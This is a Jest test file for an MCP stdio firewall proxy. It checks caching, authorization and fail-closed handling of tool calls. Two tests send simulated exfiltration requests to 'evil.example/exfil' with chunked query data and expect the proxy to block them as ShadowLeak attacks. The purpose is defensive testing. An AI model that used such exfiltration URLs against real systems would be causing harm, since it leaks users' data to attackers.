import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { PassThrough } from 'node:stream';
import { afterEach, beforeEach, describe, expect, it } from '@jest/globals';
import { initializeCache } from '../src/cache/index.js';
import { createStdioFirewallProxy, StdioFirewallProxy } from '../src/stdio/proxy.js';

const proxyToken = '12345678901234567890123456789012';

const createNhiAuthorization = (scopes: string[]): string => {
  const payload = JSON.stringify({
    token: proxyToken,
    scopes,
  });

  return `Bearer ${Buffer.from(payload, 'utf8').toString('base64')}`;
};

const waitForJsonLine = async (stream: PassThrough): Promise<Record<string, unknown>> => {
  return new Promise((resolve, reject) => {
    let buffer = '';

    const cleanup = (): void => {
      stream.off('data', onData);
      stream.off('error', onError);
    };

    const onError = (error: Error): void => {
      cleanup();
      reject(error);
    };

    const onData = (chunk: Buffer | string): void => {
      buffer += chunk.toString();
      const newlineIndex = buffer.indexOf('\n');
      if (newlineIndex === -1) {
        return;
      }

      const line = buffer.slice(0, newlineIndex).trim();
      cleanup();
      resolve(JSON.parse(line) as Record<string, unknown>);
    };

    stream.on('data', onData);
    stream.on('error', onError);
  });
};

const waitForNoJsonLine = async (stream: PassThrough, timeoutMs: number): Promise<void> => {
  await new Promise<void>((resolve, reject) => {
    let buffer = '';
    let timer: NodeJS.Timeout | null = null;

    const cleanup = (): void => {
      if (timer) {
        clearTimeout(timer);
      }
      stream.off('data', onData);
      stream.off('error', onError);
    };

    const onError = (error: Error): void => {
      cleanup();
      reject(error);
    };

    const onData = (chunk: Buffer | string): void => {
      buffer += chunk.toString();
      if (buffer.includes('\n')) {
        cleanup();
        reject(new Error(`Expected no JSON line, received: ${buffer.trim()}`));
      }
    };

    timer = setTimeout(() => {
      cleanup();
      resolve();
    }, timeoutMs);

    stream.on('data', onData);
    stream.on('error', onError);
  });
};

describe('stdio firewall proxy', () => {
  let cacheDir: string;
  let extraCacheDirs: string[];
  let clientInput: PassThrough;
  let clientOutput: PassThrough;
  let clientError: PassThrough;
  let proxy: StdioFirewallProxy;

  beforeEach(async () => {
    cacheDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-stdio-cache-'));
    extraCacheDirs = [];
    clientInput = new PassThrough();
    clientOutput = new PassThrough();
    clientError = new PassThrough();

    proxy = createStdioFirewallProxy({
      input: clientInput,
      output: clientOutput,
      errorOutput: clientError,
      targetCommand: process.execPath,
      targetArgs: [path.join(process.cwd(), 'tests', 'fixtures', 'stdio-target.js')],
      cacheDir,
      cacheTtlSeconds: 60,
      alwaysCacheTools: ['read_file', 'read', 'open_file', 'list_directory', 'list_files', 'search_files', 'search'],
      neverCacheTools: ['write_file', 'write', 'create_file', 'execute_command', 'execute'],
      proxyAuthToken: proxyToken,
    });

    await proxy.start();
  });

  afterEach(async () => {
    await proxy.stop();
    fs.rmSync(cacheDir, { recursive: true, force: true });
    for (const extraCacheDir of extraCacheDirs) {
      fs.rmSync(extraCacheDir, { recursive: true, force: true });
    }
  });

  it('proxies a tool call over stdio and serves the second response from cache', async () => {
    const request = {
      jsonrpc: '2.0',
      id: 1,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: {
          query: 'TODO',
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    };

    clientInput.write(JSON.stringify(request) + '\n');
    const firstResponse = await waitForJsonLine(clientOutput);

    clientInput.write(JSON.stringify(request) + '\n');
    const secondResponse = await waitForJsonLine(clientOutput);

    expect(firstResponse.result).toEqual({
      callCount: 1,
      tool: 'search_files',
      arguments: { query: 'TODO' },
    });
    expect(secondResponse.result).toEqual(firstResponse.result);
  });

  it('accepts a common alias contract over stdio', async () => {
    const request = {
      jsonrpc: '2.0',
      id: 5,
      method: 'tools/call',
      params: {
        name: 'read',
        arguments: {
          path: '/tmp/readme.md',
          encoding: 'utf8',
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.read']),
        },
      },
    };

    clientInput.write(JSON.stringify(request) + '\n');
    const firstResponse = await waitForJsonLine(clientOutput);

    clientInput.write(JSON.stringify(request) + '\n');
    const secondResponse = await waitForJsonLine(clientOutput);

    expect(firstResponse.result).toEqual({
      callCount: 1,
      tool: 'read',
      arguments: { path: '/tmp/readme.md', encoding: 'utf8' },
    });
    expect(secondResponse.result).toEqual(firstResponse.result);
  });

  it('blocks ShadowLeak-style exfiltration before the target executes', async () => {
    const request = {
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/call',
      params: {
        name: 'fetch_url',
        arguments: {
          url: 'https://evil.example/exfil?a=x&b=y&c=z',
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.fetch_url']),
        },
      },
    };

    clientInput.write(JSON.stringify(request) + '\n');
    const response = await waitForJsonLine(clientOutput);

    expect(response.error).toBeDefined();
    expect((response.error as { data?: { code?: string } }).data?.code).toBe('SHADOWLEAK_DETECTED');
  });

  it('blocks repeated short-chunk ShadowLeak exfiltration before the target executes', async () => {
    const request = {
      jsonrpc: '2.0',
      id: 14,
      method: 'tools/call',
      params: {
        name: 'fetch_url',
        arguments: {
          url: 'https://evil.example/exfil?d=41&d=42&d=43&d=44',
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.fetch_url']),
        },
      },
    };

    clientInput.write(JSON.stringify(request) + '\n');
    const response = await waitForJsonLine(clientOutput);

    expect(response.error).toBeDefined();
    expect((response.error as { data?: { code?: string } }).data?.code).toBe('SHADOWLEAK_DETECTED');
  });

  it('fails closed when stdio auth is configured but missing from the MCP message', async () => {
    const request = {
      jsonrpc: '2.0',
      id: 3,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: {
          query: 'missing-auth',
        },
      },
    };

    clientInput.write(JSON.stringify(request) + '\n');
    const response = await waitForJsonLine(clientOutput);

    expect((response.error as { data?: { code?: string } }).data?.code).toBe('AUTH_FAILURE');
  });

  it('fails closed on execute_command without preflight even when no color is declared', async () => {
    const request = {
      jsonrpc: '2.0',
      id: 13,
      method: 'tools/call',
      params: {
        name: 'execute_command',
        arguments: {
          command: 'node',
          args: ['--version'],
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.execute_command']),
        },
      },
    };

    clientInput.write(JSON.stringify(request) + '\n');
    const response = await waitForJsonLine(clientOutput);

    expect(response.error).toBeDefined();
    expect((response.error as { data?: { code?: string } }).data?.code).toBe('PREFLIGHT_REQUIRED');
  });

  it('drains an in-flight response before stopping when client stdin closes', async () => {
    await proxy.stop();

    proxy = createStdioFirewallProxy({
      input: clientInput,
      output: clientOutput,
      errorOutput: clientError,
      targetCommand: process.execPath,
      targetArgs: [path.join(process.cwd(), 'tests', 'fixtures', 'slow-stdio-target.js')],
      cacheDir,
      cacheTtlSeconds: 60,
      alwaysCacheTools: ['read_file', 'read', 'open_file', 'list_directory', 'list_files', 'search_files', 'search'],
      neverCacheTools: ['write_file', 'write', 'create_file', 'execute_command', 'execute'],
      proxyAuthToken: proxyToken,
    });

    await proxy.start();

    const request = {
      jsonrpc: '2.0',
      id: 4,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: {
          query: 'slow-close',
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    };

    clientInput.end(JSON.stringify(request) + '\n');
    const response = await waitForJsonLine(clientOutput);

    expect(response.result).toEqual({
      callCount: 1,
      tool: 'search_files',
      arguments: { query: 'slow-close' },
    });
  });

  it('stops after draining the final response so the target cannot keep emitting lines', async () => {
    await proxy.stop();

    proxy = createStdioFirewallProxy({
      input: clientInput,
      output: clientOutput,
      errorOutput: clientError,
      targetCommand: process.execPath,
      targetArgs: [path.join(process.cwd(), 'tests', 'fixtures', 'heartbeat-stdio-target.js')],
      cacheDir,
      cacheTtlSeconds: 60,
      alwaysCacheTools: ['read_file', 'read', 'open_file', 'list_directory', 'list_files', 'search_files', 'search'],
      neverCacheTools: ['write_file', 'write', 'create_file', 'execute_command', 'execute'],
      proxyAuthToken: proxyToken,
    });

    await proxy.start();

    const request = {
      jsonrpc: '2.0',
      id: 6,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: {
          query: 'heartbeat-close',
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    };

    clientInput.end(JSON.stringify(request) + '\n');
    const response = await waitForJsonLine(clientOutput);

    expect(response.result).toEqual({
      callCount: 1,
      tool: 'search_files',
      arguments: { query: 'heartbeat-close' },
    });

    await waitForNoJsonLine(clientOutput, 300);
  });

  it('fails closed when the downstream target command cannot be spawned', async () => {
    await proxy.stop();

    proxy = createStdioFirewallProxy({
      input: clientInput,
      output: clientOutput,
      errorOutput: clientError,
      targetCommand: 'mcp-transport-firewall-missing-command',
      targetArgs: [],
      cacheDir,
      cacheTtlSeconds: 60,
      proxyAuthToken: proxyToken,
    });

    await proxy.start();
    await new Promise((resolve) => setTimeout(resolve, 50));

    clientInput.write(JSON.stringify({
      jsonrpc: '2.0',
      id: 7,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: { query: 'spawn-failure' },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    }) + '\n');

    const response = await waitForJsonLine(clientOutput);

    expect(response.error).toEqual(expect.objectContaining({
      code: -32004,
      message: 'Fail-Closed: target process is unavailable.',
      data: expect.objectContaining({
        code: 'TARGET_UNAVAILABLE',
      }),
    }));
  });

  it('fails closed when the downstream target emits invalid JSON', async () => {
    await proxy.stop();

    proxy = createStdioFirewallProxy({
      input: clientInput,
      output: clientOutput,
      errorOutput: clientError,
      targetCommand: process.execPath,
      targetArgs: [path.join(process.cwd(), 'tests', 'fixtures', 'invalid-json-stdio-target.js')],
      cacheDir,
      cacheTtlSeconds: 60,
      proxyAuthToken: proxyToken,
    });

    await proxy.start();

    clientInput.write(JSON.stringify({
      jsonrpc: '2.0',
      id: 8,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: { query: 'invalid-json' },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    }) + '\n');

    const response = await waitForJsonLine(clientOutput);

    expect(response.error).toEqual(expect.objectContaining({
      code: -32006,
      message: 'Fail-Closed: downstream target emitted invalid JSON.',
      data: expect.objectContaining({
        code: 'TARGET_INVALID_JSON',
      }),
    }));
  });

  it('fails closed with an explicit timeout when the downstream target is too slow', async () => {
    await proxy.stop();

    proxy = createStdioFirewallProxy({
      input: clientInput,
      output: clientOutput,
      errorOutput: clientError,
      targetCommand: process.execPath,
      targetArgs: [path.join(process.cwd(), 'tests', 'fixtures', 'slow-stdio-target.js')],
      cacheDir,
      cacheTtlSeconds: 60,
      targetTimeoutMs: 20,
      proxyAuthToken: proxyToken,
    });

    await proxy.start();

    clientInput.write(JSON.stringify({
      jsonrpc: '2.0',
      id: 9,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: { query: 'timeout' },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    }) + '\n');

    const response = await waitForJsonLine(clientOutput);

    expect(response.error).toEqual(expect.objectContaining({
      code: -32007,
      message: 'Fail-Closed: target response timed out.',
      data: {
        code: 'TARGET_RESPONSE_TIMEOUT',
        timeoutMs: 20,
      },
    }));

    await waitForNoJsonLine(clientOutput, 200);
  });

  it('continues serving requests after cache reinitialization swaps the backing store', async () => {
    clientInput.write(JSON.stringify({
      jsonrpc: '2.0',
      id: 10,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: { query: 'before-cache-swap' },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    }) + '\n');

    const firstResponse = await waitForJsonLine(clientOutput);
    expect(firstResponse.result).toEqual({
      callCount: 1,
      tool: 'search_files',
      arguments: { query: 'before-cache-swap' },
    });

    const replacementCacheDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-stdio-cache-reinit-'));
    extraCacheDirs.push(replacementCacheDir);
    initializeCache({
      serverId: 'reloaded-proxy',
      l1: { maxSize: 50, ttlMs: 60000 },
      l2: { dbPath: replacementCacheDir, ttlMs: 60000 },
      alwaysCacheTools: ['search_files'],
      neverCacheTools: [],
    });

    clientInput.write(JSON.stringify({
      jsonrpc: '2.0',
      id: 11,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: { query: 'after-cache-swap' },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    }) + '\n');

    const secondResponse = await waitForJsonLine(clientOutput);
    expect(secondResponse.result).toEqual({
      callCount: 2,
      tool: 'search_files',
      arguments: { query: 'after-cache-swap' },
    });
  });

  it('fails closed when a downstream JSON-RPC error exceeds the OOM payload limit', async () => {
    await proxy.stop();

    proxy = createStdioFirewallProxy({
      input: clientInput,
      output: clientOutput,
      errorOutput: clientError,
      targetCommand: process.execPath,
      targetArgs: [path.join(process.cwd(), 'tests', 'fixtures', 'oom-error-stdio-target.js')],
      cacheDir,
      cacheTtlSeconds: 60,
      proxyAuthToken: proxyToken,
    });

    await proxy.start();

    clientInput.write(JSON.stringify({
      jsonrpc: '2.0',
      id: 12,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: { query: 'oom-error' },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    }) + '\n');

    const response = await waitForJsonLine(clientOutput);

    expect(response.error).toEqual(expect.objectContaining({
      code: -32005,
      message: 'Fail-Closed: Response exceeds strict OOM size limit.',
      data: expect.objectContaining({
        limit: 5 * 1024 * 1024,
      }),
    }));
  });

  it('returns an explicit unavailable error when stop interrupts an in-flight request', async () => {
    await proxy.stop();

    proxy = createStdioFirewallProxy({
      input: clientInput,
      output: clientOutput,
      errorOutput: clientError,
      targetCommand: process.execPath,
      targetArgs: [path.join(process.cwd(), 'tests', 'fixtures', 'slow-stdio-target.js')],
      cacheDir,
      cacheTtlSeconds: 60,
      proxyAuthToken: proxyToken,
    });

    await proxy.start();

    clientInput.write(JSON.stringify({
      jsonrpc: '2.0',
      id: 10,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: { query: 'stop-mid-flight' },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    }) + '\n');

    await proxy.stop();
    const response = await waitForJsonLine(clientOutput);

    expect(response.error).toEqual(expect.objectContaining({
      code: -32004,
      message: 'Fail-Closed: target process is unavailable.',
      data: expect.objectContaining({
        code: 'TARGET_UNAVAILABLE',
      }),
    }));
  });
});
